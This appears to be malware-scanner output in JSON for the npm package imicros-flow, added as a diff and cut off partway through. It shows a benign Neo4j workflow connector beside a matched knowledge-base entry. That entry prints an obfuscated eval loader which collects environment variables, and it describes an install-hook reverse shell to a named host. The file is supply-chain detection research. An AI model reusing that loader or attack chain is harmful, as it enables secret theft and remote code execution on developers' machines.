@@ -1,0 +1,1901 @@
+{
+  "package_name": "imicros-flow",
+  "package_version": "0.3.8",
+  "label": "benign",
+  "detection_time": "2026-05-26T18:55:40.840482",
+  "status": "success",
+  "selected_files_count": 12,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js",
+    "package/.eslintrc.js",
+    "package/dev/connector.neo4j.old.js",
+    "package/dev/date.js",
+    "package/dev/dateNext.js",
+    "package/dev/feel.js",
+    "package/dev/getValue.js",
+    "package/dev/lodash.js",
+    "package/dev/props.js",
+    "package/dev/setValue.js",
+    "package/dev/size.js"
+  ],
+  "is_malicious": false,
+  "total_files": 12,
+  "malicious_files": 0,
+  "total_slices": 4,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/imicros-flow/0.3.8/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/imicros-flow/0.3.8/package/index.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/imicros-flow/0.3.8/package/.eslintrc.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/imicros-flow/0.3.8/package/dev/connector.neo4j.old.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "connector.neo4j.old_slice_1",
+          "code_snippet": "/**\n * @license MIT, imicros.de (c) 2018 Andreas Leinen\n */\n\"use strict\";\n\nconst db\t= require(\"neo4j-driver\").v1;\nconst _ = require(\"lodash\");\nconst Serializer = require(\"../util/serializer\");\nconst { FlowError, FlowUnvalidMapping } = require(\"../util/errors\");\nconst uuidV4 = require(\"uuid/v4\");\nconst mapper = require(\"../util/mapper\");\nconst Constants = require(\"../util/constants\");\n\nclass neo4j {\n    \n    constructor (broker, options) {\n        \n        this.broker = broker;\n        this.logger = this.broker.logger;\n\n        /* istanbul ignore else */\n        if (!this.database) {\n            this.database = {};\n            this.database.uri = options.uri || \"bolt://localhost:7474\";\n            this.database.user = options.user || \"neo4j\";\n            this.database.password = options.password || \"neo4j\";\n        }\n        \n        this.fetchBatchSize = options.fetchBatchSize || 5;\n        \n        this.serializer = new Serializer();\n        \n        this.worker = {\n            uid: uuidV4()\n        };  \n        \n        this.services = new Set();\n        this.actions = new Set();\n        \n    }\n    \n    start () {\n        \n    }\n    \n    stop () {\n        \n    }\n    \n    startService (service) {\n        this.services.add(service.name);\n        let actions = Object.keys(service.actions);\n        for (let i=0; i< actions.length; i ++) this.actions.add(service.name + \".\" + actions[i]);\n    }\n    \n    stopService (service) {\n        this.services.delete(service.name);\n        let actions = Object.keys(service.actions);\n        for (let i=0; i< actions.length; i ++) this.actions.delete(service.name + \".\" + actions[i]);\n    }\n    \n    getServiceNames() {\n        return Array.from(this.services);\n    }\n    \n    async addProcess (process) {\n        let params = {\n            uid: process.id || uuidV4(),\n            name: process.name,\n            ownerType: process.owner.type,\n            ownerId: process.owner.id,\n        };\n        let statement = \"MERGE (p:Process { uid: {uid}, ownerType: {ownerType}, ownerId: {ownerId} }) \";\n        statement += \"SET p.name = {name} \";\n        statement += \"RETURN p.uid AS id;\";\n        let result = await this.run(statement, params);\n        return result;\n    }\n    \n    async addSubscription (event) {\n        let params = {\n            processId: event.processId,\n            uid: event.id || uuidV4(),\n            name: event.name,\n            position: event.position || Constants.START_EVENT,\n            type: event.type || Constants.DEFAULT_EVENT,\n            direction: event.direction || Constants.CATCHING_EVENT,\n            interaction: event.interaction || \"\",\n            ownerType: event.owner.type,\n            ownerId: event.owner.id\n        };\n        let statement = \"MATCH (p:Process { uid: {processId}, ownerType: {ownerType}, ownerId: {ownerId} }) \";\n        statement += \"WITH p \";\n        statement += \"MERGE (e:Subscription { uid: {uid}, ownerType: {ownerType}, ownerId: {ownerId} })-[:ASSIGNED]->(p) \";\n        statement += \"SET e.name = {name}, e.position = {position}, e.type = {type}, e.direction = {direction}, e.interaction = {interaction} \";\n        statement += \"RETURN e.uid AS id \";\n        let result = await this.run(statement, params);\n        return result;\n        \n    }\n    \n    async addTask (task) {\n        let type  = \"\";\n        type = (task.service && task.action) ? Constants.SERVICE_TASK : type;\n        let params = {\n            processId: task.processId,\n            uid: task.id || uuidV4(),\n            name: task.name,\n            ownerType: task.owner.type,\n            ownerId: task.owner.id,\n            type: type,\n            service: task.service,\n            action: task.action,\n            map: task.map ? JSON.stringify(task.map) : \".\"\n        };\n        let statement = \"MATCH (p:Process { uid: {processId}, ownerType: {ownerType}, ownerId: {ownerId} }) \";\n        statement += \"WITH p \";\n        statement += \"MERGE (t:Task { uid: {uid}, ownerType: {ownerType}, ownerId: {ownerId} })-[:ASSIGNED]->(p) \";\n        statement += \"SET t.name = {name}, t.service = {service}, t.action = {action}, t.map = {map}, t.type = {type} \";\n        statement += \"RETURN t.uid AS id \";\n        let result = await this.run(statement, params);\n        return result;\n        \n    }\n    \n    async addGateway (gateway) {\n        let params = {\n            processId: gateway.processId,\n            uid: gateway.id || uuidV4(),\n            type: gateway.type || Constants.EXCLUSIVE_GATEWAY,\n            ownerType: gateway.owner.type,\n            ownerId: gateway.owner.id,\n            rule: await this.serializer.serialize(gateway.rule),\n            function: await this.serializer.serialize(gateway.function)\n        };\n        let statement = \"MATCH (p:Process { uid: {processId}, ownerType: {ownerType}, ownerId: {ownerId} }) \";\n        statement += \"WITH p \";\n        statement += \"MERGE (g:Gateway { uid: {uid}, ownerType: {ownerType}, ownerId: {ownerId} })-[:ASSIGNED]->(p) \";\n        statement += \"SET g.type = {type}, g.rule = {rule}, g.function = {function} \";\n        statement += \"RETURN g.uid AS id \";\n        let result = await this.run(statement, params);\n        return result;\n        \n    }\n    \n    async addSequence (connection) {\n        let type = connection.type || Constants.SEQUENCE_STANDARD;\n        let params = {\n            fromId: connection.fromId,\n            toId: connection.toId,\n            ownerType: connection.owner.type,\n            ownerId: connection.owner.id\n        };\n        let statement = \"MATCH (from { uid: {fromId}, ownerType: {ownerType}, ownerId: {ownerId} }) \";\n        statement += \"MATCH (to { uid: {toId}, ownerType: {ownerType}, ownerId: {ownerId} }) \";\n        statement += \"MERGE (from)-[r:\" + type + \"]->(to) \";\n        statement += \"RETURN { from: from.uid, to: to.uid, type: type(r)  } AS connection \";\n        let result = await this.run(statement, params);\n        return result;\n        \n    }\n    \n    async emit (eventName, payload, meta) {\n        // initialze missing parameters (start events w/o payload or meta data are allowed)\n        if (!meta) meta = {};\n        if (!payload) payload = {};\n\n        // set context id\n        let contextId = _.get(meta,\"flow.contextId\",uuidV4());\n        \n        // build context key for relation :Event<-:CONTEXT-:Context\n        let contextKey;\n        if (meta.flow && meta.flow.process) {\n            contextKey = meta.flow.process + \".\" + meta.flow.step;\n            if (meta.flow.cycle) contextKey += \".\" + meta.flow.cycle;\n            contextKey += \".\" + eventName;\n        }\n        if (!contextKey) {\n            if (meta.flow && meta.flow.contextId) throw new FlowError(\"Event w/o process step but with given context is not allowed\");\n            contextKey = eventName;\n        }\n        \n        // set owner, if not given\n        let owner = {\n            type: _.get(meta,\"owner.type\",\"unknwon\"),\n            id: _.get(meta,\"owner.id\",\"unknwon\")\n        };\n\n        // set process step\n        let process = {\n            name: _.get(meta,\"flow.process\",\"\") ,\n            step: _.get(meta,\"flow.step\",\"\")\n        };\n        \n        let params = {\n            eventName: eventName,\n            uid: uuidV4(),\n            timestamp: Date.now(),\n            payload: await this.serializer.serialize(payload),\n            meta: await this.serializer.serialize(meta),\n            ownerType: owner.type,\n            ownerId: owner.id,\n            contextId: contextId,\n            contextKey: contextKey,\n            process: process.name,\n            step: process.step\n        };\n        let statement = \"MERGE (c:Context { uid: {contextId} } ) \";\n        statement += \"CREATE (e:Event:OpenEvent { uid: {uid} } )<-[:CONTEXT {key: {contextKey}}]-(c) \";\n        statement += \"SET e.name = {eventName}, e.timestamp = {timestamp}, e.process = {process}, e.step = {step}, \";\n        statement += \"e.ownerType = {ownerType}, e.ownerId = {ownerId}, e.payload = {payload}, e.meta = {meta} \";\n        statement += \"RETURN { id: e.uid, name: e.name, owner: { type: e.ownerType, id: e.ownerId }, timestamp: e.timestamp } AS event;\";\n        let result = await this.run(statement, params);\n        if (!result) {\n            throw new FlowError(\"Failed to emit event\");\n        }\n        return result;\n    }\n    \n    async assignEvents(count) {\n        let params = {\n            worker: this.worker.uid,\n            count: count\n        };\n        let statement = \"MATCH (e:OpenEvent) \";\n        statement += \"WITH e ORDER BY e.timestamp LIMIT {count} \";\n        statement += \"REMOVE e:OpenEvent \";\n        statement += \"SET e:AssignedEvent, e.processed_by = {worker} \";\n        let result = await this.run(statement, params);\n        return result;\n    }\n    \n    async fetchEvents (count) {\n        let params = {\n            worker: this.worker.uid,\n            count: count\n        };\n        let statement = \"MATCH (e:AssignedEvent  { processed_by: {worker} } )<-[:CONTEXT]-(c:Context) \";\n        statement += \"WITH e, c \";\n        statement += \"LIMIT {count} \";\n        statement += \"REMOVE e:AssignedEvent \";\n        statement += \"SET e:FetchedEvent \";\n        statement += \"RETURN { uid: e.uid, name: e.name, owner: { type: e.ownerType, id: e.ownerId }, contextId: c.uid } AS event \";\n        let result = await this.run(statement, params);\n        if (!result) {\n            throw new FlowError(\"Failed to fetch new events\");\n        }\n        return result;\n    }\n    \n    /**\n     * Event Consumer\n     *     - fetch a number of events\n     *     - call subscription handler\n     */\n    async consume() {\n        await this.assignEvents(this.fetchBatchSize);\n        let events = await this.fetchEvents(this.fetchBatchSize * 2);\n        this.logger.debug(`${events.length} events fetched`, { events: events });\n        let singleEvent = async (event) => {\n            let meta = event.meta ? await this.serializer.deserialize(event.meta) : {};\n            let context = await this.context(event.contextId);\n\n            await this.handleActions(event, meta, context);\n            await this.handleGateways(event, meta, context);\n        };\n        for (let i=0; i<events.length; i++) {\n            await singleEvent(events[i].event);\n        } \n        return true;\n    }\n    \n    /**\n     * Sequence Handler for Actions\n     *     - checks event for tasks in sequence\n     *     - checks access authorization of each subscription for non-public events (owner is set)\n     *     - schedules the given action in the subsription\n     */\n    async handleActions(event, meta, context) {\n        let actions = [];\n        let calls = await this.nextActions(event);\n        let singleCall = async (call, event, meta, context) => {\n            let action = _.pick(call,[\"service\",\"action\"]);\n            // set full action name\n            action.action = action.service + \".\" + action.action;\n            // TODO: CHECK AUTHORIZATION\n\n            // Set uid\n            action.uid = uuidV4();\n            // Set triggering event\n            action.eventId = event.uid;\n            // Set meta data\n            _.set(meta,\"flow.trigger.type\", \"event\");\n            _.set(meta,\"flow.trigger.name\", event.name);\n            _.set(meta,\"flow.trigger.id\", event.uid);\n            _.set(meta,\"flow.action\", {});\n            _.set(meta,\"flow.action.id\", action.uid);\n            action.meta = await this.serializer.serialize(meta);\n            // Map params\n            try {\n                let params = mapper(call.map, context);\n                action.params = await this.serializer.serialize(params);\n            } catch (err) {\n                throw new FlowUnvalidMapping(\"unvalid task\", { map: call.map });\n            }\n            // Set owner\n            action.ownerType = call.owner.type;\n            action.ownerId = call.owner.id;\n\n            actions.push(action);\n        };\n        for (let n=0; n<calls.length; n++) {\n            await singleCall(calls[n].call, event, meta, context);\n        }\n        await this.createActions(actions);\n        return true;\n    }\n\n    /**\n     * Sequence Handler for Gateways\n     *     - checks event for gatways in sequence\n     *     - checks access authorization of each subscription for non-public events (owner is set)\n     *     - schedules an action for the gateway type\n     */\n    async handleGateways(event, meta, context) {\n        /*\n        let actions = [];\n        let calls = await this.nextActions(event);\n        let singleCall = async (call, event, meta, context) => {\n            let action = _.pick(call,[\"service\",\"action\"]);\n            // set full action name\n            action.action = action.service + \".\" + action.action;\n            // TODO: CHECK AUTHORIZATION\n\n            // Set uid\n            action.uid = uuidV4();\n            // Set triggering event\n            action.eventId = event.uid;\n            // Set meta data\n            _.set(meta,\"flow.trigger.type\", \"event\");\n            _.set(meta,\"flow.trigger.name\", event.name);\n            _.set(meta,\"flow.trigger.id\", event.uid);\n            action.meta = await this.serializer.serialize(meta);\n            // Map params\n            try {\n                let params = mapper(call.map, context);\n                action.params = await this.serializer.serialize(params);\n            } catch (err) {\n                throw new FlowUnvalidMapping(\"unvalid task\", { map: call.map });\n            }\n            // Set owner\n            action.ownerType = call.owner.type;\n            action.ownerId = call.owner.id;\n\n            actions.push(action);\n        };\n        for (let n=0; n<calls.length; n++) {\n            await singleCall(calls[n].call, event, meta, context);\n        }\n        await this.createActions(actions);\n        */\n        return true;\n    }    \n    async work() {\n        await this.assignActions(5);\n        let actions = await this.fetchActions(10);\n        this.logger.debug(`${actions.length} actions fetched`, { actions: actions, worker: this.worker.uid, filter: Array.from(this.actions) });\n        for (let i=0; i<actions.length; i++) {\n            let action = actions[i].action;\n            try {\n                let res = await this.broker.call(`${action.service}.${action.action}`, action.params, { meta: action.meta });\n                this.logger.debug(`Task ${action.service}.${action.action} executed`, { id: action.id, result: res });\n            } catch (err) {\n                this.logger.warn(`Call to task ${action.service}.${action.action} failed`, { error: err });\n                throw err;\n            }\n        }\n    }\n    \n    async createActions(actions) {\n        if (actions.length <= 0) return 0;\n        let params = {\n            actions: actions\n        };\n        let statement = \"UNWIND {actions} AS action \";\n        statement += \"MATCH (e:Event { uid: action.eventId }) \";\n        statement += \"CREATE (e)-[:NEXT]->(a:Action:OpenAction { uid: action.uid, service: action.service, action: action.action, params: action.params, \";\n        statement += \"meta: action.meta, ownerType: action.ownerType, ownerId: action.ownerId }) \";\n        statement += \"RETURN count(a) AS created;\";\n        let result = await this.run(statement, params);\n        return result;\n    }\n    \n    async assignActions(count) {\n        let params = {\n            worker: this.worker.uid,\n            actions: Array.from(this.actions),\n            count: count\n        };\n        let statement = \"MATCH (s:Worker { uid: {worker} }) \";\n        statement += \"MATCH (a:OpenAction) \";\n        statement += \"WHERE a.action IN {actions} \";\n        statement += \"WITH s, a \";\n        statement += \"LIMIT {count} \";\n        statement += \"CREATE (s)-[:ASSIGNED]->(a) \";\n        statement += \"REMOVE a:OpenAction \";\n        statement += \"SET a:AssignedAction \";\n        let result = await this.run(statement, params);\n        return result;\n    }\n    \n    async fetchActions(count) {\n        let params = {\n            worker: this.worker.uid,\n            actions: Array.from(this.actions),\n            count: count\n        };\n        let statement = \"MATCH (:Worker { uid: {worker} })-[:ASSIGNED]->(a:AssignedAction) \";\n        statement += \"WHERE a.action IN {actions} \";\n        statement += \"WITH a \";\n        statement += \"LIMIT {count} \";\n        statement += \"REMOVE a:AssignedAction \";\n        statement += \"SET a:RunningAction \";\n        statement += \"RETURN { id: a.uid, service: a.service, action: a.action, params: a.params, meta: a.meta, \";\n        statement += \"owner: { type: a.ownerType, id: a.ownerId } } AS action \";\n        let result = await this.run(statement, params);\n        return result;\n    }\n    \n    async context (contextId) {\n        let params = {\n            contextId: contextId\n        };\n        let statement = \"MATCH (c:Context { uid: {contextId}})-[k:CONTEXT]->(e:Event) \";\n        statement += \"RETURN COLLECT({key: k.key, payload: e.payload}) AS context;\";\n        let result = await this.run(statement, params);\n        if (!result) {\n            throw new FlowError(\"Failed to get context\");\n        }\n        let context = {};\n        // deserialize payloads\n        if (Array.isArray(result) && result[0].context) {\n            let a = result[0].context;\n            // set deep pathes\n            for (let i=0; i<a.length; i++) {\n                _.set(context,a[i].key, await this.serializer.deserialize(a[i].payload));\n            }\n        }\n        return context;\n    } \n    \n    async addNext (listen, task) {\n        let params = {\n            listenEvent: listen.name,\n            listenOwnerType: listen.owner.type,\n            listenOwnerId: listen.owner.id,\n            listenProcess: listen.process || \"*\",\n            listenStep: listen.step || \"*\",\n            taskProcess: task.process,\n            taskStep: task.step,\n            taskOwnerType: task.owner.type,\n            taskOwnerId: task.owner.id,\n            taskService: task.service,\n            taskAction: task.action,\n            taskMap: task.map ? JSON.stringify(task.map) : \".\",\n            doneEvent: task.onDone ? task.onDone.name : \"END\",\n            errorEvent: task.onError ? task.onError.name : \"END\"\n        };\n        let statement = \"MERGE (e:Event:Subscription { name: {listenEvent}, ownerType: {listenOwnerType}, ownerId: {listenOwnerId} }) \";\n        statement += \"MERGE (t:Task { process: {taskProcess}, step: {taskStep}, service: {taskService}, action: {taskAction}, ownerType: {taskOwnerType}, ownerId: {taskOwnerId} }) \";\n        statement += \"MERGE (e)-[n:NEXT { process: {listenProcess}, step: {listenStep} }]->(t) \";\n        statement += \"SET n.map = {taskMap} \";\n        statement += \"WITH e, t, n \";\n        // delete existing relations for DONE and ERROR events before creating new connections, becaus they can now point to other events\n        statement += \"OPTIONAL MATCH (t)-[rd:DONE]->(:Event) \";\n        statement += \"OPTIONAL MATCH (t)-[re:ERROR]->(:Event) \";\n        statement += \"DELETE rd \";\n        statement += \"DELETE re \";\n        statement += \"WITH e, t, n \";\n        // create now new relations for DONE and ERROR events\n        statement += \"MERGE (eventDone:Event { name: {doneEvent}, ownerType: {taskOwnerType}, ownerId: {taskOwnerId} }) \";\n        statement += \"MERGE (eventError:Event { name: {errorEvent}, ownerType: {taskOwnerType}, ownerId: {taskOwnerId} }) \";\n        statement += \"MERGE (t)-[done:DONE]->(eventDone) \";\n        statement += \"MERGE (t)-[error:ERROR]->(eventError) \";\n        statement += \"RETURN { name: e.name, ownerType: e.ownerType, ownerId: e.ownerId } AS event, \";\n        statement += \"{ process: t.process,  step: t.step, service: t.service, action: t.action, map: n.map, ownerType: t.ownerType, ownerId: t.ownerId } AS task, \"; \n        statement += \"{ process: n.process, step: n.step } AS listen;\";\n        let result = await this.run(statement, params);\n        // convert mappings back to objects\n        result.map(item => {\n            if (item.task && item.task.map && item.task.map !== \".\") item.task.map = JSON.parse(item.task.map);\n            return item;\n        });\n        return result;\n    }\n    \n    async nextActions (event) {\n        let params = {\n            listenEvent: event.name,\n            listenOwnerType: event.owner.type || \"\",\n            listenOwnerId: event.owner.id || \"\",\n            listenProcess: event.process || \"\",\n            listenStep: event.step || \"\"\n        };\n        let statement = \"MATCH (e:Subscription { name: {listenEvent}, ownerType: {listenOwnerType}, ownerId: {listenOwnerId} }) \";\n        statement += \"MATCH (e)-[n:NEXT]->(t) \";\n        statement += \"MATCH (t)-[c:DONE]->(done:Event) \";\n        statement += \"MATCH (t)-[:ERROR]->(error:Event) \";\n        statement += \"WHERE n.process IN [{listenProcess},'*'] AND n.step IN [{listenStep},'*'] \";\n        statement += \"RETURN { \";\n        statement += \" service: t.service, action: t.action, map: n.map, \";\n        statement += \" meta: { flow: { process: t.process, step: t.step, onDone: { event: done.name }, onError: { event: error.name } } }, \";\n        statement += \" owner: { type: t.ownerType, id: t.ownerId } \";\n        statement += \"} AS call;\";\n        let result = await this.run(statement, params);\n        // convert mappings back to objects\n        result.map(item => {\n            if (item.call && item.call.map && item.call.map !== \".\") item.call.map = JSON.parse(item.call.map);\n            return item;\n        });\n        return result;\n    }\n    \n    async createConstraints () {\n        return this.run(\"CREATE CONSTRAINT ON (s:Service) ASSERT s.name IS UNIQUE \")\n        .then(() => this.run(\"CREATE CONSTRAINT ON (p:Process) ASSERT p.uid IS UNIQUE \"))\n        .then(() => this.run(\"CREATE CONSTRAINT ON (s:Subscription) ASSERT s.uid IS UNIQUE \"))\n        .then(() => this.run(\"CREATE CONSTRAINT ON (t:Task) ASSERT t.uid IS UNIQUE \"))\n        .then(() => this.run(\"CREATE CONSTRAINT ON (g:Gateway) ASSERT g.uid IS UNIQUE \"))\n        .then(() => this.run(\"CREATE CONSTRAINT ON (w:Worklist) ASSERT w.name IS UNIQUE \"))\n        .then(() => this.run(\"CREATE CONSTRAINT ON (e:Event) ASSERT e.uid IS UNIQUE \"))\n        .then(() => this.run(\"CREATE CONSTRAINT ON (c:Context) ASSERT c.uid IS UNIQUE  \"))\n        .then(() => {return true;})\n        .catch(() => { throw new FlowError(\"Failed to create constraints\");});\n    }\n    \n    /**\n     * Register this worker in the database\n     */\n    async heartbeat () {\n        let params = {\n            worker: this.worker.uid,\n            timestamp: Date.now()\n        };\n        let statement = \"MERGE (s:Worker { uid: {worker} }) \";\n        statement += \"ON MATCH SET s.heartbeat = {timestamp} \";\n        statement += \"ON CREATE SET s.heartbeat = {timestamp} \";\n        let result = await this.run(statement, params);\n        if (!result) {\n            throw new FlowError(\"Failed to send heardbeat\");\n        }\n        return result;\n    }\n    \n    /**\n     * Connect to database\n     */\n    connect() {\n\n        this.driver = db.driver(this.database.uri, db.auth.basic(this.database.user, this.database.password));\n        \n        return this.heartbeat().then(() => {\n            this.logger.info(`Connected to ${this.database.uri}`);\n            return Promise.resolve();\n        });\n        \n    }\n\n    /**\n     * Disconnect from database\n     */\n    disconnect() {\n        \n        /* istanbul ignore next */\n        if (!this.driver) return Promise.resolve();\n        this.driver.close();\n        this.logger.info(`Disconnected from ${this.database.uri}`);\n        return Promise.resolve();\n        \n    }\n\n    /**\n     * Convert neo4j integer to js integers (or strings)\n     *\n     * @param {Object} record\n     * \n     * @returns {Object} converted record\n     */\n    transform(object) {\n        for (let property in object) {\n            if (object.hasOwnProperty(property)) {\n                const propertyValue = object[property];\n                if (db.isInt(propertyValue)) {\n                    if (db.integer.inSafeRange(propertyValue)) {\n                        object[property] = propertyValue.toNumber();\n                    } else {\n                        object[property] = propertyValue.toString();\n                    }\n                } else if (typeof propertyValue === \"object\") {\n                    this.transform(propertyValue);\n                }\n            }\n        }\n    }    \n    \n    /**\n     * Execute statement\n     *\n     * @param {String} statement \n     * @param {Object} execution parameters \n     * \n     * @returns {Object} result\n     */\n    run(statement, param) {\n        let session = this.driver.session();\n        let response = [];\n        let self = this;\n\n        return session\n            .run(statement, param)\n            .then(function (result) {\n                if (result.records) {\n                    result.records.forEach(function (record) {\n                        // Convert Integer\n                        try {\n                            self.transform(record);\n                        } catch (err) {\n                            self.logger.error(`Database err - integer transformation: ${JSON.stringify(err)}`);\n                        }\n                        response.push(record.toObject());\n                    });\n                }\n                session.close();\n                return response;\n            })\n            .catch(err => {\n                self.logger.error(`Database Statement ${statement} with params ${JSON.stringify(param)}`);\n                self.logger.error(`Database driver error: ${JSON.stringify(err)}`);\n            });\n    }    \n    \n}\n\nmodule.exports = neo4j;",
+          "is_malicious": false,
+          "malice_score": 0.4067774653434753,
+          "confidence": 0.1,
+          "behavior_summary": "When instantiated and called, the code accesses and modifies a Neo4j graph database via the neo4j-driver network API using credentials and URI provided in options (defaulting to bolt://localhost:7474 with user neo4j). It performs multiple database operations including creating and merging nodes and relationships representing processes, events, tasks, subscriptions, and actions, serializing and deserializing data payloads, and managing worker heartbeats. This facilitates workflow orchestration and event-driven task execution, enabling complex process management but also exposing sensitive database credentials and network connections that could be leveraged for unauthorized data access or manipulation if compromised.",
+          "explanation": "[LLM Judgment: Benign] The provided code is a legitimate implementation of a Neo4j database client for workflow orchestration and event-driven task execution. It uses standard APIs to connect to a Neo4j database, perform CRUD operations on graph nodes and relationships, serialize/deserialize data, and manage worker heartbeats. There is no evidence of obfuscation, dynamic code execution (e.g., eval), data exfiltration, or manipulation of environment/system variables. The code does not match the key indicators of the known malicious patterns, which involve obfuscated payload execution, dynamic imports of suspicious packages, or daemonizing background malicious processes. The presence of sensitive database credentials and network connections is typical for database clients and does not imply malicious intent by itself. Overall, the code appears to be a benign utility module for managing workflows in a Neo4j graph database.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.41714945435523987,
+              "code_similarity": 0.4786365032196045,
+              "behavior_similarity": 0.35566240549087524,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
